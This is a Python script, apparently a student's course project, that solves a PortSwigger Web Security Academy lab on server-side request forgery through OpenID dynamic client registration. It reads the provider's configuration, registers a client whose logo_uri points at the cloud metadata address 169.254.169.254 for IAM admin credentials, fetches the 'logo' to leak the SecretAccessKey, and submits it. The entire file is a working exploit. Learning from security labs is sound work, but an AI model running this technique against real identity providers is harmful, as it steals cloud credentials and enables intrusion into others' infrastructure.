# By Andrew Stevenson for CS595 at PSU Spring '21 Final Project
# Solves lab: https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import json

s = requests.Session()

# Get login form
site = 'ac5c1fdc1f5a505f80d653b900d20009.web-security-academy.net'
my_account_url = f'https://{site}/my-account'
resp = s.get(my_account_url)
soup = BeautifulSoup(resp.text, 'html.parser')
sm_login_url = soup.meta['content'][6:]

# Stash these for later
sm_site = urlparse(sm_login_url).hostname
submit_solution_path = soup.find('button', {'id': 'submitSolution'})['path']
submit_solution_url = f'https://{site}{submit_solution_path}'

# Get client reg endpoint from the config file on the oauth site
reg_config_url = f'https://{sm_site}/.well-known/openid-configuration'
resp = s.get(reg_config_url)
reg_endpoint = json.loads(resp.text)["registration_endpoint"]
print(f'Got registration endpoint from config file: \n{reg_endpoint}\n')

# Register our client, including the lie that the victim page is a logo
payload_json = {
    "redirect_uris": [
        "https://example.com"
    ],
    "logo_uri": 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/'  # Victim page!
}
headers = {
    'Host': sm_site,
    'Content-Type': 'application/json'
}
resp = s.post(reg_endpoint, json=payload_json, headers=headers)
client_id = json.loads(resp.text)['client_id']
print(f'Registering site with victim url as logo_uri: \n{payload_json}\n')
print(f'Got our client id: \n{client_id}\n')

# Now request the 'logo' from the server...
logo_uri = f'https://{sm_site}/client/{client_id}/logo'
resp = s.get(logo_uri)
secret_access_key = json.loads(resp.text)['SecretAccessKey']
print(f'Got the admin file: \n{resp.text}\n')
print(f'Got our secret access key: \n{secret_access_key}\n')

# Submit secret access key key to win level
user_data = json.loads(resp.text)
form_data = {
    'answer': secret_access_key
}
s.post(submit_solution_url, data=form_data)

# Confirm the solution solved the lab
resp = s.get(my_account_url)
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup.find(text='Congratulations, you solved the lab!'))

